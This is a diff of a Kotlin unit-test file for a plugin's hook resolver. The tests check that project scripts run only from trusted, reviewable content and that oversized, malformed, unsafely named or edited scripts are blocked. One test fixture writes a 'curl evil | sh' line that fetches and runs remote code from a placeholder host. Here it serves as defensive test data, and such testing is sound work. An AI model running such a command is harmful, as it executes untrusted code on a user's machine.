@@ -73,7 +73,7 @@ class HookResolverTest {
     @Test
     fun projectScriptsDoNotRunWhileProjectHooksAreOff() {
         val script = projectHooks.script("file-saved")
-        trust.trust(project, "file-saved", TrustStore.sha256(script.readBytes()))
+        assertTrue(trust.trust(project, "file-saved", script.readBytes()))
         switches.projectHooksEnabled = false
 
         assertTrue(resolver.resolve(saved()).isEmpty())
@@ -82,7 +82,7 @@ class HookResolverTest {
     @Test
     fun aTrustedProjectScriptRunsFromAPrivateCopyOfTheTrustedBytes() {
         val script = projectHooks.script("file-saved.d/lint", "#!/bin/sh\necho lint\n")
-        trust.trust(project, "file-saved.d/lint", TrustStore.sha256(script.readBytes()))
+        assertTrue(trust.trust(project, "file-saved.d/lint", script.readBytes()))
 
         val resolved = resolver.resolve(saved()).single()
 
@@ -99,7 +99,7 @@ class HookResolverTest {
     fun aTrustedProjectScriptWithoutTheExecutableBitStillRuns() {
         // Projects live on shared storage, which keeps no executable bits.
         val script = projectHooks.script("file-saved", executable = false)
-        trust.trust(project, "file-saved", TrustStore.sha256(script.readBytes()))
+        assertTrue(trust.trust(project, "file-saved", script.readBytes()))
 
         val resolved = resolver.resolve(saved()).single()
 
@@ -108,20 +108,50 @@ class HookResolverTest {
 
     @Test
     fun anOversizedProjectScriptNeverRunsEvenIfItsContentIsTrusted() {
-        val big = "#!/bin/sh\n" + "#".repeat(ScriptReview.MAX_BYTES) + "\n"
+        val line = "#" + "x".repeat(62) + "\n"
+        val big = line.repeat(ScriptReview.MAX_BYTES / line.length + 1)
         val script = projectHooks.script("file-saved", big)
-        trust.trust(project, "file-saved", TrustStore.sha256(script.readBytes()))
+        // An approval recorded without the check, as an older version of this plugin could have.
+        trust.put(project, "file-saved", TrustStore.sha256(script.readBytes()))
 
         assertTrue(resolver.resolve(saved()).isEmpty())
-        assertTrue(log.pending.value.single().tooLarge)
+        assertEquals("it is larger than 64 KB", log.pending.value.single().notReviewable)
         assertTrue(verified.listFiles().orEmpty().isEmpty())
+    }
+
+    @Test
+    fun aTrustedProjectScriptThatCannotBeReviewedNeverRuns() {
+        val script = projectHooks.script("file-saved", "#!/bin/sh\r\necho hi\r\n")
+        trust.put(project, "file-saved", TrustStore.sha256(script.readBytes()))
+
+        assertTrue(resolver.resolve(saved()).isEmpty())
+        val pending = log.pending.value.single()
+        assertEquals("line 1, column 10: a carriage return", pending.notReviewable)
+        assertTrue(verified.listFiles().orEmpty().isEmpty())
+    }
+
+    @Test
+    fun aProjectScriptWithAnUnsafeNameIsListedWithTheReasonAndNeverRuns() {
+        projectHooks.script("file-saved.d/with space")
+
+        assertTrue(resolver.resolve(saved()).isEmpty())
+        assertEquals(ScriptReview.Reason.UnsafeName.message, log.pending.value.single().notReviewable)
+    }
+
+    @Test
+    fun aReviewableUntrustedScriptIsListedForReviewWithoutAReason() {
+        projectHooks.script("file-saved")
+
+        resolver.resolve(saved())
+
+        assertEquals(null, log.pending.value.single().notReviewable)
     }
 
     @Test
     fun pruningKeepsOnlyCopiesOfTrustedContent() {
         val kept = projectHooks.script("file-saved", "#!/bin/sh\necho kept\n")
         val keptSha = TrustStore.sha256(kept.readBytes())
-        trust.trust(project, "file-saved", keptSha)
+        trust.put(project, "file-saved", keptSha)
         resolver.resolve(saved())
         File(verified, "0".repeat(64)).writeText("stale")
         File(verified, keptSha + HookResolver.TEMP_SUFFIX).writeText("half")
@@ -135,7 +165,7 @@ class HookResolverTest {
     @Test
     fun editingATrustedProjectScriptMakesItUntrustedAgain() {
         val script = projectHooks.script("file-saved")
-        trust.trust(project, "file-saved", TrustStore.sha256(script.readBytes()))
+        assertTrue(trust.trust(project, "file-saved", script.readBytes()))
         script.writeText("#!/bin/sh\ncurl evil | sh\n")
 
         assertTrue(resolver.resolve(saved()).isEmpty())
@@ -146,7 +176,7 @@ class HookResolverTest {
     fun globalScriptsRunBeforeProjectScripts() {
         paths.globalHooks.script("file-saved")
         val project1 = projectHooks.script("file-saved")
-        trust.trust(project, "file-saved", TrustStore.sha256(project1.readBytes()))
+        assertTrue(trust.trust(project, "file-saved", project1.readBytes()))
 
         assertEquals(listOf(ScriptSource.GLOBAL, ScriptSource.PROJECT), resolver.resolve(saved()).map { it.source })
     }
